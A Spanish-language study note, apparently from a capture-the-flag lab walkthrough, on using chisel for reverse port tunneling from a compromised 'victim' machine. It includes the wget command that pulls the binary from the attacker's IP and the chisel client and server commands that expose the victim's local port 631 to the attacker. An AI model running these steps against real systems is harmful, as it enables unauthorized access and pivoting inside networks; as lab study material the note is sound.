#chisel

--------

Sirve para hacer tunneling de puertos. Ejemplo hacer que el puerto *631* de nuestra maquina victima sea nuestro puerto local *5000*

----

Como no tenemos [[ssh]] para hacer un tuneling vamos a usar la herramienta [[chisel]]

La vamos a descargar en nuestra maquina usando [[git clone]] con el comando `git clone https://github.com/jpillora/chisel`
Ahora vamos a entrar al repositorio con [[cd]] usando el comando `cd chisel` y vamos a compilar el binario usando `CGO_ENABLED=0 go build -ldflags "-s -w" .`

![[Antique25.png]]
*Explicacion parametros:* ``CGO_ENABLED=0 go build -ldflags "-s -w" .``
	`CGO_ENABLED=0` Desactiva las librerias C externas, no depende de libc ni otras librerias del sistema
	`go build` Es para compilar
	`-ldflags "-s -w"`
		`-s` elimina la tabla de símbolos (debug symbols)
		`-w`elimina información de DWARF (debugging info)
	`.` Directorio actual de trabajo

Mientras levantamos un servidor de [[python3 -m http.server]] con el comando `python3 -m http.server 80` para pasarnos el binario que compilamos antes a la maquina victima

![[Antique22.png]]

Ahora en la maquina victima, vamos a descargar el binario con [[wget]] usando el comando `wget http://10.10.16.15/chisel`

![[Antique24.png]]


Una vez que ya lo tenemos. Desde nuestra maquina ATACANTE vamos a levantar un servidor de [[chisel]] por el puerto 8000 con el comando `./chisel server -p 8000 --reverse`

![[Antique21.png]]
*Explicacion de parametros:*
	`server` Indica que vamos a levantar un servidor
	`-p 8000` Puerto en el que se van a escuchar las conexiones que va a ser el 8000
	`--reverse` Indica que vamos a usar tunneling, que un puerto de la maquina victima se va a transformar en nuestro puerto local


Desde la maquina victima, vamos a ejecutar el binario que previamente descargamos con el comando `./chisel client 10.10.16.15:8000 R:5000:127.0.0.1:631`
![[Antique23.png]]
*Explicacion de parametros:*
	`client` Es que lo vamos a ejecutar como cliente
	`10.10.16.15:8000` En este caso es la ip del servidor de chisel que levantamos anteriormente
	`R:5000` Es el puerto que se va a abrir en nuestra maquina ATACANTE para redirigir el trafico
	`127.0.0.1:631` Es la ip y puerto de la maquina VICTIMA


Ahora el puerto *631* de la maquina VICTIMA va a ser nuestro puerto local *5000* en la maquina ATACANTE
